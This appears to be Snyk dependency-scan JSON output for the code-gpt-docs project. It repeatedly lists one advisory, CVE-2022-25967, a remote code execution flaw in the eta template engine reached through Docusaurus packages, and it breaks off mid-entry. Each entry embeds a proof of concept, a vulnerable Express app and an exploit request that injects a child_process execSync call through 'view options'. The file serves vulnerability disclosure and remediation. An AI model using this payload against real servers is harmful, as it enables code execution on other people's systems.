{
  "ok": false,
  "vulnerabilities": [
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-search-algolia@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/plugin-content-blog@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/plugin-content-docs@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/plugin-content-pages@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-debug@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
